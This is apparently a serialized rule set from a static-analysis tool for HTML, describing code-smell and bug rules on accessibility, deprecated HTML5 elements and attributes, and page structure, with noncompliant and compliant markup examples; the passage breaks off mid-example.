<p>Landmark roles are: <code>banner</code>, <code>complementary</code>, <code>contentinfo</code>, <code>form</code>, <code>main</code>,
<code>navigation</code>, <code>search</code>, <code>application</code>.&nbsp;</p>
<p>The use of ARIA markup helps users of&nbsp;screen readers navigate across blocks of content. For example it makes groups of links easier to locate
or skip.</p>
<h2>Noncompliant Code Example</h2>
<p>Multiple <code>&lt;nav&gt;</code> element</p>
<pre>
&lt;nav&gt; &lt;!-- Noncompliant --&gt;
    &lt;ul&gt;
        &lt;li&gt;A list of navigation links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/nav&gt;

&lt;article&gt;
    &lt;nav&gt; &lt;!-- Noncompliant --&gt;
        Another list of navigation links
    &lt;/nav&gt;
&lt;/article&gt;
</pre>
<p>Repeated "landmark" role <code>"navigation"</code></p>
<pre>
&lt;div id="mainnav" role="navigation"&gt; &lt;!-- Noncompliant --&gt;
    &lt;h2 id="mainnavheading"&gt;Site Navigation&lt;/h2&gt;
    &lt;ul&gt;
       &lt;li&gt;List of links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
&lt;div id="secondarynav" role="navigation"&gt; &lt;!-- Noncompliant --&gt;
    &lt;h2 id="secondarynavheading"&gt;Related links&lt;/h2&gt;
    &lt;ul&gt;
       &lt;li&gt;List of links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;nav aria-label="Site menu"&gt;
    &lt;ul&gt;
        &lt;li&gt;A list of navigation links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/nav&gt;

&lt;article&gt;
    &lt;nav aria-label="Related links"&gt;
        Another list of navigation links
    &lt;/nav&gt;
&lt;/article&gt;
</pre>
<pre>
&lt;div id="mainnav" role="navigation" aria-labelledby="mainnavheading"&gt;
    &lt;h2 id="mainnavheading"&gt;Site Navigation&lt;/h2&gt;
    &lt;ul&gt;
       &lt;li&gt;List of links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
&lt;div id="secondarynav" role="navigation" aria-labelledby="secondarynavheading"&gt;
    &lt;h2 id="secondarynavheading"&gt;Related links&lt;/h2&gt;
    &lt;ul&gt;
       &lt;li&gt;List of links&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/ARIA11.html">WCAG2, ARIA11</a> - Using ARIA landmarks to identify regions of a page </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H97.html">WCAG2, H97</a> - Grouping related links using the nav element </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0&amp;showtechniques=131#qr-content-structure-separation-programmatic">WCAG2
  1.3.1</a> Info and Relationships </li>
</ul>Z
CODE_SMELL
Ç
	Web:S5257Ù
WebS52575HTML "<table>" should not be used for layout purposes"MAJOR*web:ñ<p>HTML &lt;table&gt; elements should not be used for layout purpose as it can confuse screen readers. It is recommended to use CSS instead.</p>
<p>This rule raises an issue on every <code>&lt;table&gt;</code> element containing a <code>role</code>&nbsp;attribute set to
<code>"presentation"</code> or <code>"none"</code>, which is how <a href="https://www.w3.org/WAI/tutorials/tables/tips/">W3C recommends</a> marks
layout tables.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table role="presentation"&gt;
&lt;!-- ... --&gt;
&lt;/table&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3schools.com/html/html_layout.asp">HTML Layouts</a> </li>
</ul>Z
CODE_SMELL
‡
Web:MaxLineLengthCheck≈
WebMaxLineLengthCheckLines should not be too long"MAJOR*web:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
à
Web:ChildElementRequiredCheckÊ
WebChildElementRequiredCheck%Track lack of required child elements"MAJOR*web:Ç<p>This rule checks that the specified child elements are present inside the specified parent elements. </p>
<h2>Noncompliant Code Example</h2>
<p>Given a parent/child combination of <code>&lt;head&gt;</code>/<code>&lt;title&gt;</code>:</p>
<pre>
&lt;html&gt;
  &lt;head&gt;
  &lt;/head&gt;  &lt;!-- Noncompliant; no title element --&gt;
  &lt;body&gt;
    ...
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;My Page&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    ...
</pre>@Z
CODE_SMELL
ß
Web:RequiredAttributeCheckà
WebRequiredAttributeCheck!Track lack of required attributes"MAJOR*web:≠<p>This rule checks that the specified attributes are present in HTML tags.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a required attribute list of: <code>img.alt,img.height,img.width</code>:</p>
<pre>
&lt;img src="/images/queen.png"&gt; &lt;!-- Noncompliant; missing all required attributes --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;img src="/images/queen.png" width="60" height="85" alt="Elizabeth II"&gt;
</pre>Z
CODE_SMELL
ø
	Web:S4084±
WebS4084Videos should have subtitles"MAJOR*web:Ï
<p>In order to make your site usable by as many people as possible, subtitles should be provided for videos.</p>
<p>This rule raises an issue when a <code>video</code> does not include at least one <code>&lt;track/&gt;</code> tag with the <code>kind</code>
attribute set to <code>captions</code>, or <code>descriptions</code> or at the very least <code>subtitles</code>.</p>
<p>Note that the <code>subtitles</code> kind is not meant for accessibility but for translation. The kind <code>captions</code> targets people with
hearing impairment, whereas <code>descriptions</code> targets people with vision impairment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;video id="video" controls preload="metadata"&gt;
   &lt;source src="resources/myvideo.mp4" type="video/mp4"&gt;
   &lt;source src="resources/myvideo.webm" type="video/webm"&gt;
&lt;/video&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;video id="video" controls preload="metadata"&gt;
   &lt;source src="resources/myvideo.mp4" type="video/mp4"&gt;
   &lt;source src="resources/myvideo.webm" type="video/webm"&gt;
   &lt;track label="English" kind="captions" srclang="en" src="resources/myvideo-en.vtt" default&gt;
   &lt;track label="Deutsch" kind="captions" srclang="de" src="resources/myvideo-de.vtt"&gt;
   &lt;track label="Espa√±ol" kind="captions" srclang="es" src="resources/myvideo-es.vtt"&gt;
&lt;/video&gt;
</pre>Z
CODE_SMELL
Ä
	Web:S5254Ú
WebS52541"<html>" element should have a language attribute"MAJOR*web:ü<p>The <code>&lt;html&gt;</code>&nbsp;element should provide the <code>lang</code> and/or <code>xml:lang</code> attribute in order to identify the
default language of a document.</p>
<p>It enables assistive technologies, such as screen readers,&nbsp;to provide a comfortable reading experience by adapting the pronunciation and
accent to the language. It also helps braille translation software, telling it to switch the control codes for accented characters for instance.</p>
<p>Other benefits of marking the language include:</p>
<ul>
  <li> assisting user agents in providing dictionary definitions or helping users benefit from translation tools. </li>
  <li> improving <a href="https://blogs.bing.com/webmaster/2011/03/01/how-to-tell-bing-your-websites-country-and-language/">search engine ranking</a>.
  </li>
</ul>
<p>Both the <code>lang</code> and the <code>xml:lang</code> attributes can take only one value.</p>
<p>&nbsp;</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt; &lt;!-- Noncompliant --&gt;
&nbsp;&nbsp;&nbsp; &lt;head&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;title&gt;A page written in english&lt;/title&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;meta content="text/html; charset=utf-8" /&gt;
&nbsp;&nbsp;&nbsp; &lt;/head&gt; &nbsp;


&nbsp;&nbsp;&nbsp; &lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; ... &nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; &lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&nbsp;&nbsp;&nbsp; &lt;head&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;title&gt;A page written in english&lt;/title&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;meta content="text/html; charset=utf-8" /&gt;
&nbsp;&nbsp;&nbsp; &lt;/head&gt; &nbsp;


&nbsp;&nbsp;&nbsp; &lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; ... &nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; &lt;/body&gt;
&lt;/html&gt;
</pre>
<pre>
&lt;!DOCTYPE html&gt;
&lt;html lang="en" xml:lang="en"&gt;
&nbsp;&nbsp;&nbsp; &lt;head&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;title&gt;A page written in english&lt;/title&gt;
 &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;meta content="text/html; charset=utf-8" /&gt;
&nbsp;&nbsp;&nbsp; &lt;/head&gt; &nbsp;


&nbsp;&nbsp;&nbsp; &lt;body&gt; &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; ... &nbsp;&nbsp;
&nbsp;&nbsp;&nbsp; &lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/html.html#H57">WCAG2, H57</a> - Using language attributes on the html element </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-meaning-doc-lang-id">WCAG2, 3.1.1</a> - Language of Page </li>
</ul>ZBUG
£
Web:DoctypePresenceCheckÜ
WebDoctypePresenceCheck<"<!DOCTYPE>" declarations should appear before "<html>" tags"MAJOR*web:ô<p>The <code>&lt;!DOCTYPE&gt;</code> declaration tells the web browser which (X)HTML version is being used on the page, and therefore how to interpret
the various elements.</p>
<p>Validators also rely on it to know which rules to enforce.</p>
<p>It should always preceed the <code>&lt;html&gt;</code> tag.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;html&gt;  &lt;!-- Noncompliant --&gt;
...
&lt;/html&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;  &lt;!-- Compliant --&gt;
...
&lt;/html&gt;
</pre>ZBUG
Ê
Web:IllegalElementCheck 
WebIllegalElementCheck!Track uses of disallowed elements"MAJOR*web:Ú<p>This rule checks that the specified HTML elements are not present.</p>
<h2>Noncompliant Code Example</h2>
<p>For a disallowed list of "font,center":</p>
<pre>
&lt;center&gt;&lt;font color="red"&gt;Hello World!&lt;/font&gt;&lt;/center&gt; &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;div class="centerRed"&gt;Hello World!&lt;/div&gt;
</pre>Z
CODE_SMELL
ƒ
Web:UnsupportedTagsInHtml5Check†
WebUnsupportedTagsInHtml5Check/Elements deprecated in HTML5 should not be used"MAJOR*web:π<p>With the advent of HTML5, many old elements were deprecated. To ensure the best user experience, deprecated elements should not be used. This rule
checks for the following deprecated elements:</p>
<table>
  <tbody>
    <tr>
      <th>Element</th>
      <th>Remediation Action</th>
    </tr>
    <tr>
      <td><code>basefont</code>, <code>big</code>, <code>blink</code>, <code>center</code>, <code>font</code>, <code>marquee</code>,
      <code>multicol</code>, <code>nobr</code>, <code>spacer</code>, <code>tt</code></td>
      <td>use CSS</td>
    </tr>
    <tr>
      <td><code>acronym</code></td>
      <td>use <code>abbr</code></td>
    </tr>
    <tr>
      <td><code>applet</code></td>
      <td>use <code>embed</code> or <code>object</code></td>
    </tr>
    <tr>
      <td><code>bgsound</code></td>
      <td>use <code>audio</code></td>
    </tr>
    <tr>
      <td><code>frame</code>, <code>frameset</code>, <code>noframes</code></td>
      <td>restructure the page to remove frames</td>
    </tr>
    <tr>
      <td><code>isindex</code></td>
      <td>use form controls</td>
    </tr>
    <tr>
      <td><code>dir</code></td>
      <td>use <code>ul</code></td>
    </tr>
    <tr>
      <td><code>hgroup</code></td>
      <td>use <code>header</code> or <code>div</code></td>
    </tr>
    <tr>
      <td><code>listing</code></td>
      <td>use <code>pre</code> and <code>code</code></td>
    </tr>
    <tr>
      <td><code>nextid</code></td>
      <td>use GUIDS</td>
    </tr>
    <tr>
      <td><code>noembed</code></td>
      <td>use <code>object</code> instead of <code>embed</code> when fallback is necessary</td>
    </tr>
    <tr>
      <td><code>plaintext</code></td>
      <td>use the "text/plain" MIME type</td>
    </tr>
    <tr>
      <td><code>strike</code></td>
      <td>use <code>del</code> or <code>s</code></td>
    </tr>
    <tr>
      <td><code>xmp</code></td>
      <td>use <code>pre</code> or <code>code</code>, and escape "&lt;" and "&amp;" characters</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> W3C, <a href="http://www.w3.org/TR/html5-diff">Obsolete Features</a> </li>
  <li> WHATWG, <a href="https://html.spec.whatwg.org/multipage/obsolete.html">Obsolete Features</a> </li>
</ul>ZBUG

Web:FileLengthCheckÿ
WebFileLengthCheck,Files should not have too many lines of code"MAJOR*web:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
Í
Web:ParentElementRequiredCheck«
WebParentElementRequiredCheck&Track lack of required parent elements"MAJOR*web:b<p>This rule checks that required HTML parent elements are present for certain child elements.</p>@Z
CODE_SMELL
ÎH
	Web:S1827›H
WebS18272Attributes deprecated  in HTML5 should not be used"MAJOR*web:ÇH<p>With the advent of HTML5, many old attributes were deprecated. To ensure the best user experience, deprecated attributes should not be used. This
rule checks for the following deprecated attributes, where CSS should be used instead.</p>
<h3>Attributes</h3>
<table>
  <tbody>
    <tr>
      <th>Attribute</th>
      <th>Removed from</th>
    </tr>
    <tr>
      <td><code>accept</code></td>
      <td><code>form</code></td>
    </tr>
    <tr>
      <td><code>align</code></td>
      <td><code>caption</code>, <code>col</code>, <code>div</code>, <code>embed</code>, <code>h1-h6</code>, <code>hr</code>, <code>iframe</code>,
      <code>img</code>, <code>input</code>, <code>legend</code>, <code>object</code>, <code>p</code>, <code>table</code>, <code>tbody</code>,
      <code>thead</code>, <code>tfoot</code>, <code>td</code>, <code>th</code>, <code>tr</code></td>
    </tr>
    <tr>
      <td><code>alink</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>allowtransparency</code></td>
      <td><code>iframe</code></td>
    </tr>
    <tr>
      <td><code>archive</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>axis</code></td>
      <td><code>td</code>, <code>th</code></td>
    </tr>
    <tr>
      <td><code>background</code></td>
      <td><code>body</code>, <code>table</code>, <code>thead</code>, <code>tbody</code>, <code>tfoot</code>, <code>tr</code>, <code>td</code>,
      <code>th</code></td>
    </tr>
    <tr>
      <td><code>bgcolor</code></td>
      <td><code>body</code>, <code>table</code>, <code>td</code>, <code>th</code>, <code>tr</code></td>
    </tr>
    <tr>
      <td><code>border</code></td>
      <td><code>img</code> (<code>border="0"</code> allowed), <code>object</code></td>
    </tr>
    <tr>
      <td><code>bordercolor</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>cellpadding</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>cellspacing</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>char</code></td>
      <td><code>col</code>, <code>tbody</code>, <code>thead</code>, <code>tfoot</code>, <code>td</code>, <code>th</code>, <code>tr</code></td>
    </tr>
    <tr>
      <td><code>charoff</code></td>
      <td><code>col</code>, <code>tbody</code>, <code>thead</code>, <code>tfoot</code>, <code>td</code>, <code>th</code>, <code>tr</code></td>
    </tr>
    <tr>
      <td><code>charset</code></td>
      <td><code>a</code>, <code>link</code></td>
    </tr>
    <tr>
      <td><code>classid</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>clear</code></td>
      <td><code>br</code></td>
    </tr>
    <tr>
      <td><code>code</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>codebase</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>codetype</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>color</code></td>
      <td><code>hr</code></td>
    </tr>
    <tr>
      <td><code>compact</code></td>
      <td><code>dl</code>, <code>ol</code>, <code>ul</code></td>
    </tr>
    <tr>
      <td><code>coords</code></td>
      <td><code>a</code></td>
    </tr>
    <tr>
      <td><code>datafld</code></td>
      <td><code>a</code>, <code>applet</code>, <code>button</code>, <code>div</code>, <code>fieldset</code>, <code>frame</code>, <code>iframe</code>,
      <code>img</code>, <code>input</code>, <code>label</code>, <code>legend</code>, <code>marquee</code>, <code>object</code>, <code>param</code>,
      <code>select</code>, <code>span</code>, <code>textarea</code></td>
    </tr>
    <tr>
      <td><code>dataformatas</code></td>
      <td><code>button</code>, <code>div</code>, <code>input</code>, <code>label</code>, <code>legend</code>, <code>marquee</code>,
      <code>object</code>, <code>option</code>, <code>select</code>, <code>span</code>, <code>table</code></td>
    </tr>
    <tr>
      <td><code>datapagesize</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>datasrc</code></td>
      <td><code>a</code>, <code>applet</code>, <code>button</code>, <code>div</code>, <code>frame</code>, <code>iframe</code>, <code>img</code>,
      <code>input</code>, <code>label</code>, <code>legend</code>, <code>marquee</code>, <code>object</code>, <code>option</code>,
      <code>select</code>, <code>span</code>, <code>table</code>, <code>textarea</code></td>
    </tr>
    <tr>
      <td><code>declare</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>event</code></td>
      <td><code>script</code></td>
    </tr>
    <tr>
      <td><code>for</code></td>
      <td><code>script</code></td>
    </tr>
    <tr>
      <td><code>frame</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>frameborder</code></td>
      <td><code>iframe</code></td>
    </tr>
    <tr>
      <td><code>height</code></td>
      <td><code>td</code>, <code>th</code></td>
    </tr>
    <tr>
      <td><code>hspace</code></td>
      <td><code>embed</code>, <code>iframe</code>, <code>img</code>, <code>input</code>, <code>object</code></td>
    </tr>
    <tr>
      <td><code>ismap</code></td>
      <td><code>input</code></td>
    </tr>
    <tr>
      <td><code>langauge</code></td>
      <td><code>script</code> (<code>language="javascript"</code>, case insensitive, allowed)</td>
    </tr>
    <tr>
      <td><code>link</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>lowsrc</code></td>
      <td><code>img</code></td>
    </tr>
    <tr>
      <td><code>marginbottom</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>marginheight</code></td>
      <td><code>body</code>, <code>iframe</code></td>
    </tr>
    <tr>
      <td><code>marginleft</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>marginright</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>margintop</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>marginwidth</code></td>
      <td><code>body</code>, <code>iframe</code></td>
    </tr>
    <tr>
      <td><code>methods</code></td>
      <td><code>a</code>, <code>link</code></td>
    </tr>
    <tr>
      <td><code>name</code></td>
      <td><code>a</code> (<code>name="[a's element id]"</code> allowed), <code>embed</code>, <code>img</code>, <code>option</code></td>
    </tr>
    <tr>
      <td><code>nohref</code></td>
      <td><code>area</code></td>
    </tr>
    <tr>
      <td><code>noshade</code></td>
      <td><code>hr</code></td>
    </tr>
    <tr>
      <td><code>nowrap</code></td>
      <td><code>td</code>, <code>th</code></td>
    </tr>
    <tr>
      <td><code>profile</code></td>
      <td><code>head</code></td>
    </tr>
    <tr>
      <td><code>rules</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>scheme</code></td>
      <td><code>meta</code></td>
    </tr>
    <tr>
      <td><code>scope</code></td>
      <td><code>td</code></td>
    </tr>
    <tr>
      <td><code>scrolling</code></td>
      <td><code>iframe</code></td>
    </tr>
    <tr>
      <td><code>shape</code></td>
      <td><code>a</code></td>
    </tr>
    <tr>
      <td><code>size</code></td>
      <td><code>hr</code></td>
    </tr>
    <tr>
      <td><code>standby</code></td>
      <td><code>object</code></td>
    </tr>
    <tr>
      <td><code>summary</code></td>
      <td><code>table</code></td>
    </tr>
    <tr>
      <td><code>target</code></td>
      <td><code>link</code></td>
    </tr>
    <tr>
      <td><code>text</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>type</code></td>
      <td><code>li</code>, <code>param</code>, <code>ul</code></td>
    </tr>
    <tr>
      <td><code>urn</code></td>
      <td><code>a</code>, <code>link</code></td>
    </tr>
    <tr>
      <td><code>usemap</code></td>
      <td><code>input</code></td>
    </tr>
    <tr>
      <td><code>valign</code></td>
      <td><code>col</code>, <code>tbody</code>, <code>thead</code>, <code>tfoot</code>, <code>td</code>, <code>th</code>, <code>tr</code></td>
    </tr>
    <tr>
      <td><code>valuetype</code></td>
      <td><code>param</code></td>
    </tr>
    <tr>
      <td><code>version</code></td>
      <td><code>html</code></td>
    </tr>
    <tr>
      <td><code>vlink</code></td>
      <td><code>body</code></td>
    </tr>
    <tr>
      <td><code>vspace</code></td>
      <td><code>embed</code>, <code>iframe</code>, <code>img</code>, <code>input</code>, <code>object</code></td>
    </tr>
    <tr>
      <td><code>width</code></td>
      <td><code>col</code>, <code>hr</code>, <code>pre</code>, <code>table</code>, <code>td</code>, <code>th</code></td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> W3C, <a href="http://www.w3.org/TR/html5-diff">Differences in HTML5</a> </li>
  <li> W3C, <a href="http://www.w3.org/TR/html5/obsolete.html">Obsolete Features</a> </li>
  <li> WHATWG, <a href="https://html.spec.whatwg.org/multipage/obsolete.html">Obsolete Features</a> </li>
</ul>Z
CODE_SMELL
Õ
Web:AvoidCommentedOutCodeCheck™
WebAvoidCommentedOutCodeCheck,Sections of code should not be commented out"MAJOR*web:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
Ò
Web:DynamicJspIncludeCheck“
WebDynamicJspIncludeCheck#Dynamic includes should not be used"MAJOR*web:ı<p>Content that doesn't change or that doesn't change often should be included using a mechanism which won't try to interpret it. Specifically,
<code>&lt;%@ include file="..." %&gt;</code>, which includes the file in the JSP servlet translation phase (i.e. it happens once), should be used
instead of <code>&lt;jsp:include page="..." /&gt;</code>, which includes the page on the file, when the content is being served to the user.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;jsp:include page="header.jsp"&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;%@ include file="header.jsp" %&gt;
</pre>Z
CODE_SMELL
Õ
Web:MetaRefreshCheck¥
WebMetaRefreshCheck3Meta tags should not be used to refresh or redirect"MAJOR*web:Õ<p>Use of <code>&lt;meta http-equiv="refresh"&gt;</code> is discouraged by the World Wide Web Consortium (W3C).</p>
<p>If a user clicks the 'Back' button, some browers will go back to the redirecting page, which will prevent the user from actually going back.</p>
<p>To refresh the page, a better alternative is to use Ajax, to refresh only what needs to be refreshed and not the whole page.</p>
<p>To redirect to another page, using the HTTP response status code 301 'Moved Permanently' and 302 'Found' is a better option.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;head&gt;
  &lt;meta http-equiv="refresh" content="5"&gt;   &lt;!-- Non-Compliant --&gt;
  &lt;meta name="description" content="..."&gt;
&lt;/head&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;head&gt;
  &lt;meta name="description" content="..."&gt;
&lt;/head&gt;
</pre>Z
CODE_SMELL
—
Web:LinkToNothingCheck∂
WebLinkToNothingCheck3Links should not target "#" or "javascript:void(0)""MAJOR*web:Õ<p>There are two ways to build a link that has the sole purpose of running JavaScript code. The goal of this rule is to ban such patterns in order to
support browsing with JavaScript disabled.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;a href="#" onclick="alert('Clicked!'); return false;"&gt;Run JavaScript Code&lt;/a&gt; &lt;!-- Noncompliant --&gt;
&lt;a href="javascript:void(0)" onclick="alert('Clicked!'); return false;"&gt;Run JavaScript Code&lt;/a&gt;  &lt;!-- Noncompliant --&gt;
&lt;a id="inPageAnchor"&gt;Jump down the page to me&lt;/a&gt;  &lt;!-- Compliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;a id="inPageAnchor"&gt;Jump down the page to me&lt;/a&gt;  &lt;!-- Compliant --&gt;
</pre>Z
CODE_SMELL
Ä
	Web:S1436Ú
WebS14368Track lack of required an element with the required "id""MAJOR*web:ë<p>This rule allows you to make sure that each HTML page contains an element with your configured ID, regardless of element type. This rule is useful,
for instance, if your design requires a placeholder to be present in each page, for example to dynamically insert a footer.</p>
<h2>Compliant Solution</h2>
<p>With a required id of "#footer":</p>
<pre>
&lt;div id="#footer"&gt;
...
&lt;/div&gt;
</pre>Z
CODE_SMELL
ß
Web:ChildElementIllegalCheckÜ
WebChildElementIllegalCheck'Track uses of disallowed child elements"MAJOR*web:°<p>This rule checks that the specified child tag does not appear as a direct child of the specified parent.</p>
<h2>Noncompliant Code Example</h2>
<p>Assuming a parent/child combination of <code>head</code>/<code>body</code>:</p>
<pre>
&lt;head&gt;
  ...
  &lt;body&gt;  &lt;!-- Noncompliant --&gt;
    ...
  &lt;/body&gt;
&lt;/head&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;head&gt;
  ...
&lt;/head&gt;
</pre>@Z
CODE_SMELL
ù%
 Web:TableHeaderHasIdOrScopeCheck¯$
WebTableHeaderHasIdOrScopeCheck2"<th>" tags should have "id" or "scope" attributes"MAJOR*web:ç$<p>Associating <code>&lt;table&gt;</code> headers, i.e. <code>&lt;th&gt;</code> elements, with their <code>&lt;td&gt;</code> cells enables screen
readers to announce the header prior to the data. This considerably increases the accessibility of tables to visually impaired users.</p>
<p>There are two ways of doing it:</p>
<ul>
  <li> Adding a <code>scope</code> attribute to <code>&lt;th&gt;</code> headers. </li>
  <li> Adding an <code>id</code> attribute to <code>&lt;th&gt;</code> headers and a <code>headers</code> attribute to every <code>&lt;td&gt;</code>
  element. </li>
</ul>
<p>It is recommended to add <code>scope</code> attributes to <code>&lt;th&gt;</code> headers whenever possible. Use <code>&lt;th id="..."&gt;</code>
and <code>&lt;td headers="..."&gt;</code> only when <code>&lt;th scope="..."&gt;</code> is not capable of associating cells to their headers. This
happens for very complex tables which have headers splitting the data in multiple subtables. See&nbsp;<a
href="https://www.w3.org/WAI/tutorials/tables/tips/">W3C WAI&nbsp;Web Accessibility Tutorials</a>&nbsp;for more information.</p>
<p>Note that complex tables can often be split into multiple smaller tables, which improves the user experience.</p>
<p>This rule raises an issue when a <code>&lt;th&gt;</code> element has neither <code>id</code> nor <code>scope</code> attributes set.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table border="1"&gt;
  &lt;caption&gt;Contact Information&lt;/caption&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;/td&gt;
    &lt;th&gt;Name&lt;/th&gt;                                          &lt;!-- Non-Compliant --&gt;
    &lt;th&gt;Phone#&lt;/th&gt;                                        &lt;!-- Non-Compliant --&gt;
    &lt;th&gt;City&lt;/th&gt;                                          &lt;!-- Non-Compliant --&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;1.&lt;/td&gt;
    &lt;th&gt;Joel Garner&lt;/th&gt;                                   &lt;!-- Non-Compliant --&gt;
    &lt;td&gt;412-212-5421&lt;/td&gt;
    &lt;td&gt;Pittsburgh&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;2.&lt;/td&gt;
    &lt;th&gt;Clive Lloyd&lt;/th&gt;                                   &lt;!-- Non-Compliant --&gt;
    &lt;td&gt;410-306-1420&lt;/td&gt;
    &lt;td&gt;Baltimore&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;table border="1"&gt;
  &lt;caption&gt;Contact Information&lt;/caption&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;/td&gt;
    &lt;th scope="col"&gt;Name&lt;/th&gt;                              &lt;!-- Compliant --&gt;
    &lt;th scope="col"&gt;Phone#&lt;/th&gt;                            &lt;!-- Compliant --&gt;
    &lt;th scope="col"&gt;City&lt;/th&gt;                              &lt;!-- Compliant --&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;1.&lt;/td&gt;
    &lt;th scope="row"&gt;Joel Garner&lt;/th&gt;                       &lt;!-- Compliant --&gt;
    &lt;td&gt;412-212-5421&lt;/td&gt;
    &lt;td&gt;Pittsburgh&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;2.&lt;/td&gt;
    &lt;th scope="row"&gt;Clive Lloyd&lt;/th&gt;                       &lt;!-- Compliant --&gt;
    &lt;td&gt;410-306-1420&lt;/td&gt;
    &lt;td&gt;Baltimore&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre>
<p>or:</p>
<pre>
&lt;table border="1"&gt;
  &lt;caption&gt;Contact Information&lt;/caption&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;/td&gt;
    &lt;th id="name"&gt;Name&lt;/th&gt;                                &lt;!-- Compliant --&gt;
    &lt;th id="phone"&gt;Phone#&lt;/th&gt;                             &lt;!-- Compliant --&gt;
